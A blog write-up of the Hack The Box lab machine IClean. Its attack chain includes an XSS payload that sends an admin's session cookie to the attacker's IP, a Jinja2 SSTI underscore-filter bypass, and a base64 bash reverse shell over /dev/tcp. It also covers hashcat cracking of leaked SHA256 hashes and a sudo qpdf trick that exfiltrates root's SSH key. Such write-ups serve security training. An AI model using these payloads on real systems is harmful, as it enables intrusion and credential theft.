---
layout: post
title: Hack The Box Walkthrough - IClean
date: 2024-08-03
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2024/08/HTB/IClean
img: 2024/08/IClean/IClean.png
---

In IClean, I had to exploit XSS and SSTI to get a shell on the box. Then I found a password hash in the database to become a user. And finally exploited a PDF utility to become root. I really enjoyed that box. I quickly had a good idea of the vulnerabilities I had to exploit. But they were not as trivial to abuse as I first thought.

* Room: IClean
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/IClean](https://app.hackthebox.com/machines/IClean)
* Author: [LazyTitan33](https://app.hackthebox.com/users/512308)

## Enumeration

I started the box by running some enumeration. First, I looked for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.131.237:80
Open 10.129.131.237:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 17:05 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.

...

Host is up, received echo-reply ttl 63 (0.069s latency).
Scanned at 2024-06-09 17:05:54 EDT for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=6/9%OT=22%CT=%CU=42371%PV=Y%DS=2%DC=T%G=N%TM=6666193F%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)

...

Uptime guess: 8.269 days (since Sat Jun  1 10:39:22 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   111.05 ms 10.10.14.1
2   111.13 ms target (10.129.131.237)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:06
Completed NSE at 17:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:06
Completed NSE at 17:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:06
Completed NSE at 17:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds
           Raw packets sent: 60 (4.236KB) | Rcvd: 42 (3.136KB)
```

The target server appeared to be running Ubuntu. It had two open ports: 22 (SSH) and 80 (HTTP). I also scanned for UDP ports. Nothing interesting came out of it.

The site on port 80 was redirecting to 'capiclean.htb'. I added that domain to my hosts files and checked for subdomains.


```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 27 -H "Host:FUZZ.capiclean.htb" "http://capiclean.htb"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://capiclean.htb/
Total requests: 653911

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000002:   400        10 L     35 W       301 Ch      "*"
000323231:   400        10 L     35 W       301 Ch      "#mail"
000420118:   400        10 L     35 W       301 Ch      "#pop3"
000493603:   400        10 L     35 W       301 Ch      "#smtp"
000594301:   400        10 L     35 W       301 Ch      "#www"

Total time: 0
Processed Requests: 653911
Filtered Requests: 653906
Requests/sec.: 0
```

It did not find any subdomains.

## Web Application

I took a look at the application on port 80.

![Website](/assets/images/2024/08/IClean/Website.png "Website")

I launched Feroxbuster to scan the website for hidden pages while I manually explored the application.

```bash
$ feroxbuster -u http://capiclean.htb -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://capiclean.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      189c http://capiclean.htb/logout => http://capiclean.htb/
200      GET      193l      579w     8592c http://capiclean.htb/services
200      GET        3l       39w     1008c http://capiclean.htb/static/images/toggle-icon.png
200      GET        8l       53w     2064c http://capiclean.htb/static/images/icon-2.png
200      GET        6l       73w     3248c http://capiclean.htb/static/css/owl.carousel.min.css
200      GET        6l      352w    19190c http://capiclean.htb/static/js/popper.min.js
200      GET        5l       46w     1384c http://capiclean.htb/static/images/search-icon.png
200      GET       90l      181w     2237c http://capiclean.htb/quote
200      GET      167l      997w    83329c http://capiclean.htb/static/images/img-7.png
200      GET        4l       53w     2119c http://capiclean.htb/static/images/twitter-icon.png
200      GET       15l      110w     7039c http://capiclean.htb/static/images/logo.png
200      GET        6l       44w     1013c http://capiclean.htb/static/css/owl.theme.default.min.css
200      GET        4l       53w     1995c http://capiclean.htb/static/images/fb-icon.png
200      GET        5l       52w     2215c http://capiclean.htb/static/images/linkden-icon.png
200      GET      130l      355w     5267c http://capiclean.htb/about
200      GET       88l      159w     2106c http://capiclean.htb/login
200      GET        5l       57w     2262c http://capiclean.htb/static/images/instagram-icon.png
200      GET        3l       50w     1779c http://capiclean.htb/static/images/map-icon.png
200      GET        3l       56w     2181c http://capiclean.htb/static/images/icon-1.png
200      GET      154l      399w     6084c http://capiclean.htb/choose
200      GET      213l     1380w    11324c http://capiclean.htb/static/js/jquery-3.0.0.min.js
200      GET      369l     1201w     9644c http://capiclean.htb/static/js/custom.js
200      GET        3l       17w     1061c http://capiclean.htb/static/images/favicon.png
200      GET      872l     1593w    16549c http://capiclean.htb/static/css/style.css
200      GET      446l     1347w    11748c http://capiclean.htb/static/css/responsive.css
200      GET        5l     1287w    87088c http://capiclean.htb/static/js/jquery.min.js
200      GET        8l       63w     2400c http://capiclean.htb/static/images/call-icon.png
200      GET      162l      931w    80352c http://capiclean.htb/static/images/img-4.png
200      GET      229l     1282w    93801c http://capiclean.htb/static/images/img-5.png
200      GET      180l     1125w    84070c http://capiclean.htb/static/images/img-6.png
200      GET      349l     1208w    16697c http://capiclean.htb/
200      GET      183l      564w     8109c http://capiclean.htb/team
200      GET        7l     1604w   140421c http://capiclean.htb/static/css/bootstrap.min.css
200      GET     3448l    10094w    89992c http://capiclean.htb/static/js/owl.carousel.js
302      GET        5l       22w      189c http://capiclean.htb/dashboard => http://capiclean.htb/
200      GET      605l     3945w   299706c http://capiclean.htb/static/images/img-3.png
200      GET      332l     1920w   144448c http://capiclean.htb/static/images/img-2.png
405      GET        5l       20w      153c http://capiclean.htb/sendMessage
200      GET        5l      478w    45479c http://capiclean.htb/static/js/jquery.mCustomScrollbar.concat.min.js
200      GET        1l      153w    22994c http://capiclean.htb/static/js/jquery.fancybox.min.js
200      GET        0l        0w   155871c http://capiclean.htb/static/images/img-1.png
200      GET        0l        0w    42839c http://capiclean.htb/static/css/jquery.mCustomScrollbar.min.css
200      GET        0l        0w    70808c http://capiclean.htb/static/js/bootstrap.bundle.min.js
200      GET        0l        0w   918708c http://capiclean.htb/static/js/plugin.js
403      GET        9l       28w      278c http://capiclean.htb/server-status
[####################] - 8m    119650/119650  0s      found:45      errors:89
[####################] - 8m    119601/119601  260/s   http://capiclean.htb/
```

The application was pretty simple. It was a marketing site for a cleaning service. Most of the page appeared to be static. There was a login page. I tried a few injection payloads, but nothing worked. It did not appear to provide information about if a user existed or not. Feroxbuster found a dashboard page, but it was redirecting to the home page. It probably required to be logged in.


## XSS

The site had a page to request a quote.

![Get a Quote](/assets/images/2024/08/IClean/GetAQuote.png "Get a Quote")

When I requested one, the site displayed a thank you page without reflecting the provided information.

![Thank You for Your Request](/assets/images/2024/08/IClean/ThankYouForYourRequest.png "Thank You for Your Request")


I tried to send some XSS payloads as a quote. The email field required a valid email in the UI, so I used Caido to tamper with the email and the service fields.

```http
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://capiclean.htb
Connection: keep-alive
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=<img src="http://10.10.14.104/service" />&email=<img src="http://10.10.14.104/mail" />
```

I started a web server on my machine and after a few seconds I got a request. There was something looking at my requests, and the service field was vulnerable.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.103.132 - - [23/Jun/2024 11:40:23] code 404, message File not found
10.129.103.132 - - [23/Jun/2024 11:40:23] "GET /service HTTP/1.1" 404
```

With that information, I tried some payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection). I managed to get some scripts loaded from my server, but they did not appear to be executed on the admin's browser.

I tried to run some JS in the error handling of an image.

```http
POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://capiclean.htb
Connection: keep-alive
Referer: http://capiclean.htb/quote
Upgrade-Insecure-Requests: 1

service=<img src="" onerror="fetch('http://10.10.14.104/err?c='%2Bdocument.cookie)">&email=email
```

This worked, and I had the session cookie of the admin that looked at my request.

```bash
10.129.103.132 - - [23/Jun/2024 11:46:03] code 404, message File not found
10.129.103.132 - - [23/Jun/2024 11:46:03] "GET /err?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZngEsA.kG7K7mmZ6X1QVj68JK0My9D2rO8 HTTP/1.1" 404 -
```


## Dashboard

I added the cookie found with the XSS to my browser and tried loading the dashboard.

![Dashboard](/assets/images/2024/08/IClean/Dashboard.png "Dashboard")

The dashboard had few functionalities. I quickly looked at all of them.

### Invoice Generator

The 'Invoice Generator' requested a few information to create an invoice.

![Invoice Generator](/assets/images/2024/08/IClean/InvoiceGenerator.png "Invoice Generator")

Once the invoice was generated, it only returned its ID.

![Invoice ID](/assets/images/2024/08/IClean/InvoiceIdGenerated.png "Invoice ID")

### Generate QR

In this page, I could use the invoice ID generated by the previous page to create a QR code.

![Generate QR](/assets/images/2024/08/IClean/GenerateQRCode.png "Generate QR")

After generation, it gave me the URL to a QR code.

![QR Code Generated](/assets/images/2024/08/IClean/QRCodeGenerated.png "QR Code Generated")

The QR code was a link to the actual invoice.

![Invoice](/assets/images/2024/08/IClean/Invoice.png "Invoice")

A lot of information in the invoice was random. But the project, client, address, and email were the information I provided in the invoice generator. I tried sending SSTI payloads in there, but all the special characters were stripped out.

### Edit Services

This page allowed modifying the description of a service.

![Edit Service Details](/assets/images/2024/08/IClean/EditServices.png "Edit Service Details")

The only editable field on this page was the description. I tried to modify the other fields in Caido, but they were ignored. The description changes worked. But it was not reflected in the main site, nor in the invoices I generated.

### Quote Requests


The 'Quote Requests' page showed the requests that were sent from the site. This is the page that was vulnerable to XSS.

![Quote Requested](/assets/images/2024/08/IClean/QuoteRequested.png "Quote Requested")

## Server Side Template Injection

I spent a lot of time trying to get SSTI in the invoices. None of my payloads worked. I tried escaping them, it did not change anything. Everything was removed before it made it to the invoice.

It took me a long time, but eventually I realized that the QR link field from the QR Generator was reflected in the invoice it produced.

![Insert QR Link](/assets/images/2024/08/IClean/InsertQRLink.png "Insert QR Link")

I missed it because it was part of the base64 data of an image tag.

```html
<div class="qr-code-container">
        <div class="qr-code"><img src="data:image/png;base64,aaaa" alt="QR Code"></div>
```

I tried sending {% raw %}`{{ 7 * 7 }}`{% endraw %}, it came back as 49.

```html
<div class="qr-code"><img src="data:image/png;base64,49" alt="QR Code">
```

I had SSTI. But I hit another wall here. I was able to dump simple objects like `config` or `namespace`.

```html
<div class="qr-code"><img src="data:image/png;base64,&lt;class &#39;jinja2.utils.Namespace&#39;&gt;" alt="QR Code"></div>
```

But when I tried sending more complicated payloads, it resulted in a server error. Anything with `__` failed. I searched for payloads without underscores and found a [nice blog post](https://0day.work/jinja2-template-injection-filter-bypasses/).

I used the first part of the post and finally got a payload that gave me code execution on the server. I was not able to use anything with underscores in my payload. But I was able to get data from the request. I used the URL to pass `__init__` and `__globals__`.


```http
POST /QRGenerator?init=__init__&globals=__globals__ HTTP/1.1
```

Then, I could use those URL parameters in my payload.

{% raw %}
```
invoice_id=aaaa&form_type=scannable_invoice&qr_link={{namespace[request.args.init][request.args.globals]['os']['popen']('id').read()}}
```
{% endraw %}

I looked at the response, I had code execution.

```html
<div class="qr-code"><img src="data:image/png;base64,uid=33(www-data) gid=33(www-data) groups=33(www-data)" alt="QR Code"></div>
```

I built a reverse shell payload in base64.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.104/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA0LzQ0NDQgMD4mMSAK
```

And I sent it to the server.

{% raw %}
```
invoice_id=aaaa&form_type=scannable_invoice&qr_link={{namespace[request.args.init][request.args.globals]['os']['popen']('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA0LzQ0NDQgMD4mMSAK|base64 -d|bash').read()}}
```
{% endraw %}

I got the shell.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.103.132] 49718
bash: cannot set terminal process group (1204): Inappropriate ioctl for device
bash: no job control in this shell

www-data@iclean:/opt/app$ whoami
whoami
www-data
```

## User consuela

I looked at the code for the website.

```bash
www-data@iclean:/opt/app$ ls
ls
app.py
static
templates
```

The application had database credentials.

```python
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}

app._static_folder = os.path.abspath("/opt/app/static/")

def rdu(value):
    return str(value).replace('__', '')

...
```

I tried using them in SSH, it did not work. So I connected to the database and looked at what it contained.


```sql
www-data@iclean:/opt/app$ mysql -hlocalhost -u iclean -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 450
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> Show Databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use capiclean
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> Select * From users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)
```

I found two password hash in the database. A quick look at the code showed they were SHA256.


```python
password = hashlib.sha256(request.form['password'].encode()).hexdigest()
```

I used hashcat to crack them.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt --username -m1400
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6848/13761 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:REDACTED
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: hash.txt
Time.Started.....: Sun Jun 23 09:21:11 2024 (3 secs)
Time.Estimated...: Sun Jun 23 09:21:14 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4310.0 kH/s (0.85ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[216361726f6c696e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 67%

Started: Sun Jun 23 09:20:54 2024
Stopped: Sun Jun 23 09:21:15 2024

$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt --username -m1400 --show
consuela:0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:REDACTED
```

I used the password to SSH to the server and read the user flag.

```bash
$ ssh consuela@target
consuela@target's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sun Jun 23 01:22:55 PM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.

consuela@iclean:~$ ls
user.txt

consuela@iclean:~$ cat user.txt
REDACTED
```

## Getting root

I only saw that when I went through my notes after I finished the box, but the user had an email that contained a small hint. Luckily, the hint was not needed.

```
consuela@iclean:~$ cat /var/spool/mail/consuela
To: <consuela@capiclean.htb>
Subject: Issues with PDFs
From: management <management@capiclean.htb>
Date: Wed September 6 09:15:33 2023



Hey Consuela,

Have a look over the invoices, I've been receiving some weird PDFs lately.

Regards,
Management
```

I checked if I could run anything with `sudo`.

```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela:
Sorry, try again.
[sudo] password for consuela:
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

I was allowed to run [QPDF](https://qpdf.readthedocs.io/en/stable/) as any user on the machine. This utility allows interacting with PDF files. I looked for ways to append the content of files to a PDF. Since I could run it as root, this would allow me to read any file on the server.

I found that I could [add attachments to a PDF](https://qpdf.readthedocs.io/en/stable/cli.html#embedded-files-attachments). I added the root SSH private key to a PDF I found on the server.

```bash
consuela@iclean:~$ find / -name '*.pdf' 2>/dev/null
/usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf

consuela@iclean:~$ cp /usr/share/doc/shared-mime-info/shared-mime-info-spec.pdf original.pdf

consuela@iclean:~$ sudo qpdf original.pdf --add-attachment /root/.ssh/id_rsa --mimetype=text/plain -- withKey.pdf
```

The attachments were not displayed in my PDF reader, but I could also extract them with QPDF.

```bash
consuela@iclean:~$ qpdf --list-attachments withKey.pdf
id_rsa -> 653,0

consuela@iclean:~$ qpdf --show-attachment=id_rsa withKey.pdf
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

I saved the SSH key to my machine and used it to reconnect as root.

```bash
$ cat root_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----

$ chmod 600 root_id_rsa

$ ssh -i root_id_rsa root@target
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sun Jun 23 02:18:37 PM UTC 2024

Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@iclean:~# ls
root.txt  scripts

root@iclean:~# cat root.txt
REDACTED
```